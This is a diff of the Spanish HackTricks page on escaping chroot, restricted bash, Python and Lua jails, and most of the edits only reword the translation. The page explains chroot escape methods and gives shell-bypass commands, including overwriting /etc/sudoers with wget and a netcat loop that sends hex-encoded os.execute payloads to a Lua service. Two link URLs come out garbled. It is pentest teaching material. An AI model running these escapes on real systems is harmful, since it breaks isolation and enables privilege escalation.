@@ -1,4 +1,4 @@
-# Escapando de Jaulas
+# Escapando de Jails
 
 {% hint style="success" %}
 Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
@@ -10,7 +10,7 @@ Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" d
 
 * Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
+* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos de github.
 
 </details>
 {% endhint %}
@@ -21,8 +21,8 @@ Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" d
 
 ## Escapes de Chroot
 
-Desde [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): El mecanismo chroot **no está destinado a defender** contra manipulaciones intencionales por **usuarios privilegiados** (**root**). En la mayoría de los sistemas, los contextos chroot no se apilan correctamente y los programas chrooted **con suficientes privilegios pueden realizar un segundo chroot para escapar**.\
-Por lo general, esto significa que para escapar necesitas ser root dentro del chroot.
+De [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): El mecanismo chroot **no está destinado a defenderse** contra manipulaciones intencionales por parte de **usuarios privilegiados** (**root**). En la mayoría de los sistemas, los contextos chroot no se apilan correctamente y los programas chrooted **con suficientes privilegios pueden realizar un segundo chroot para escapar**.\
+Generalmente esto significa que para escapar necesitas ser root dentro del chroot.
 
 {% hint style="success" %}
 La **herramienta** [**chw00t**](https://github.com/earthquake/chw00t) fue creada para abusar de los siguientes escenarios y escapar de `chroot`.
@@ -31,12 +31,12 @@ La **herramienta** [**chw00t**](https://github.com/earthquake/chw00t) fue creada
 ### Root + CWD
 
 {% hint style="warning" %}
-Si eres **root** dentro de un chroot **puedes escapar** creando **otro chroot**. Esto se debe a que 2 chroots no pueden coexistir (en Linux), por lo que si creas una carpeta y luego **creas un nuevo chroot** en esa nueva carpeta estando **fuera de él**, ahora estarás **fuera del nuevo chroot** y por lo tanto estarás en el FS.
+Si eres **root** dentro de un chroot **puedes escapar** creando **otro chroot**. Esto se debe a que 2 chroots no pueden coexistir (en Linux), así que si creas una carpeta y luego **creas un nuevo chroot** en esa nueva carpeta siendo **tú fuera de ella**, ahora estarás **fuera del nuevo chroot** y, por lo tanto, estarás en el FS.
 
-Esto ocurre porque por lo general chroot NO mueve tu directorio de trabajo al indicado, por lo que puedes crear un chroot pero estar fuera de él.
+Esto ocurre porque generalmente chroot NO mueve tu directorio de trabajo al indicado, así que puedes crear un chroot pero estar fuera de él.
 {% endhint %}
 
-Por lo general no encontrarás el binario `chroot` dentro de una cárcel chroot, pero **podrías compilar, subir y ejecutar** un binario:
+Generalmente no encontrarás el binario `chroot` dentro de una cárcel chroot, pero **podrías compilar, subir y ejecutar** un binario:
 
 <details>
 
@@ -91,10 +91,10 @@ system("/bin/bash");
 ```
 </details>
 
-### Root + Descriptor de archivo guardado
+### Root + Saved fd
 
 {% hint style="warning" %}
-Esto es similar al caso anterior, pero en este caso el **atacante almacena un descriptor de archivo en el directorio actual** y luego **crea el chroot en una nueva carpeta**. Finalmente, como tiene **acceso** a ese **FD** **fuera** del chroot, accede a él y se **escapa**.
+Esto es similar al caso anterior, pero en este caso el **atacante almacena un descriptor de archivo en el directorio actual** y luego **crea el chroot en una nueva carpeta**. Finalmente, como tiene **acceso** a ese **FD** **fuera** del chroot, accede a él y **escapa**.
 {% endhint %}
 
 <details>
@@ -125,21 +125,21 @@ chroot(".");
 ### Root + Fork + UDS (Unix Domain Sockets)
 
 {% hint style="warning" %}
-Los descriptores de archivo se pueden pasar a través de Unix Domain Sockets, por lo tanto:
+FD se puede pasar a través de Unix Domain Sockets, así que:
 
-* Crear un proceso hijo (fork)
-* Crear UDS para que el padre y el hijo puedan comunicarse
-* Ejecutar chroot en el proceso hijo en un directorio diferente
-* En el proceso padre, crear un descriptor de archivo de un directorio que esté fuera del nuevo chroot del proceso hijo
-* Pasar ese descriptor de archivo al proceso hijo usando el UDS
-* El proceso hijo cambia su directorio actual a ese descriptor de archivo, y debido a que está fuera de su chroot, escapará de la cárcel
+* Crea un proceso hijo (fork)
+* Crea UDS para que el padre y el hijo puedan comunicarse
+* Ejecuta chroot en el proceso hijo en una carpeta diferente
+* En el proceso padre, crea un FD de una carpeta que esté fuera del nuevo chroot del proceso hijo
+* Pasa ese FD al proceso hijo usando el UDS
+* El proceso hijo cambia de directorio a ese FD, y debido a que está fuera de su chroot, escapará de la cárcel
 {% endhint %}
 
 ### Root + Mount
 
 {% hint style="warning" %}
 * Montar el dispositivo raíz (/) en un directorio dentro del chroot
-* Hacer chroot en ese directorio
+* Chroot en ese directorio
 
 Esto es posible en Linux
 {% endhint %}
@@ -147,31 +147,31 @@ Esto es posible en Linux
 ### Root + /proc
 
 {% hint style="warning" %}
-* Montar procfs en un directorio dentro del chroot (si aún no está montado)
-* Buscar un PID que tenga una entrada de raíz/cwd diferente, como: /proc/1/root
-* Hacer chroot en esa entrada
+* Montar procfs en un directorio dentro del chroot (si aún no lo está)
+* Buscar un pid que tenga una entrada de root/cwd diferente, como: /proc/1/root
+* Chroot en esa entrada
 {% endhint %}
 
 ### Root(?) + Fork
 
 {% hint style="warning" %}
-* Crear un Fork (proceso hijo) y hacer chroot en un directorio diferente más profundo en el sistema de archivos y cambiar al mismo
-* Desde el proceso padre, mover la carpeta donde se encuentra el proceso hijo a una carpeta anterior al chroot de los hijos
+* Crea un Fork (proceso hijo) y chroot en una carpeta diferente más profunda en el FS y CD en ella
+* Desde el proceso padre, mueve la carpeta donde se encuentra el proceso hijo a una carpeta anterior al chroot de los hijos
 * Este proceso hijo se encontrará fuera del chroot
 {% endhint %}
 
 ### ptrace
 
 {% hint style="warning" %}
-* Hace tiempo, los usuarios podían depurar sus propios procesos desde un proceso de sí mismos... pero esto ya no es posible de forma predeterminada
-* De todos modos, si es posible, podrías hacer ptrace en un proceso y ejecutar un shellcode dentro de él ([ver este ejemplo](linux-capabilities.md#cap\_sys\_ptrace)).
+* Hace tiempo, los usuarios podían depurar sus propios procesos desde un proceso de sí mismos... pero esto ya no es posible por defecto
+* De todos modos, si es posible, podrías ptrace en un proceso y ejecutar un shellcode dentro de él ([ver este ejemplo](linux-capabilities.md#cap\_sys\_ptrace)).
 {% endhint %}
 
-## Jaulas de Bash
+## Bash Jails
 
 ### Enumeración
 
-Obtener información sobre la cárcel:
+Obtén información sobre la cárcel:
 ```bash
 echo $SHELL
 echo $PATH
@@ -181,7 +181,7 @@ pwd
 ```
 ### Modificar PATH
 
-Verifique si puede modificar la variable de entorno PATH.
+Verifica si puedes modificar la variable de entorno PATH
 ```bash
 echo $PATH #See the path of the executables that you can use
 PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
@@ -194,14 +194,14 @@ echo /home/* #List directory
 ```
 ### Crear script
 
-Verifique si puede crear un archivo ejecutable con _/bin/bash_ como contenido
+Verifica si puedes crear un archivo ejecutable con _/bin/bash_ como contenido
 ```bash
 red /bin/bash
 > w wx/path #Write /bin/bash in a writable and executable path
 ```
 ### Obtener bash desde SSH
 
-Si estás accediendo a través de ssh, puedes usar este truco para ejecutar un shell de bash:
+Si estás accediendo a través de ssh, puedes usar este truco para ejecutar un shell bash:
 ```bash
 ssh -t user@<IP> bash # Get directly an interactive shell
 ssh user@<IP> -t "bash --noprofile -i"
@@ -215,32 +215,32 @@ BASH_CMDS[shell]=/bin/bash;shell -i
 ```
 ### Wget
 
-Puedes sobrescribir, por ejemplo, el archivo sudoers
+Puedes sobrescribir, por ejemplo, el archivo sudoers.
 ```bash
 wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ```
 ### Otros trucos
 
 [**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
-[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
-[https://gtfobins.github.io](https://gtfobins.github.io)\
+[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
+[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
 **También podría ser interesante la página:**
 
 {% content-ref url="../bypass-bash-restrictions/" %}
 [bypass-bash-restrictions](../bypass-bash-restrictions/)
 {% endcontent-ref %}
 
-## Jaulas de Python
+## Python Jails
 
-Trucos sobre cómo escapar de las jaulas de Python en la siguiente página:
+Trucos sobre cómo escapar de los python jails en la siguiente página:
 
 {% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
 [bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
 {% endcontent-ref %}
 
-## Jaulas de Lua
+## Lua Jails
 
-En esta página puedes encontrar las funciones globales a las que tienes acceso dentro de Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)
+En esta página puedes encontrar las funciones globales a las que tienes acceso dentro de lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)
 
 **Eval con ejecución de comandos:**
 ```bash
@@ -255,7 +255,7 @@ Enumerar funciones de una biblioteca:
 ```bash
 for k,v in pairs(string) do print(k,v) end
 ```
-Ten en cuenta que cada vez que ejecutas el comando anterior en un **entorno lua diferente, el orden de las funciones cambia**. Por lo tanto, si necesitas ejecutar una función específica, puedes realizar un ataque de fuerza bruta cargando diferentes entornos lua y llamando a la primera función de la biblioteca le:
+Nota que cada vez que ejecutas la línea anterior en un **entorno lua diferente, el orden de las funciones cambia**. Por lo tanto, si necesitas ejecutar una función específica, puedes realizar un ataque de fuerza bruta cargando diferentes entornos lua y llamando a la primera función de la biblioteca:
 ```bash
 #In this scenario you could BF the victim that is generating a new lua environment
 #for every interaction with the following line and when you are lucky
@@ -266,7 +266,7 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 #and "char" from string library, and the use both to execute a command
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
 ```
-**Obtener un shell interactivo de lua**: Si te encuentras dentro de un shell de lua limitado, puedes obtener un nuevo shell de lua (y con suerte ilimitado) ejecutando:
+**Obtener una shell lua interactiva**: Si estás dentro de una shell lua limitada, puedes obtener una nueva shell lua (y con suerte ilimitada) llamando:
 ```bash
 debug.debug()
 ```
@@ -284,7 +284,7 @@ Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" d
 
 * Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
 
 </details>
 {% endhint %}
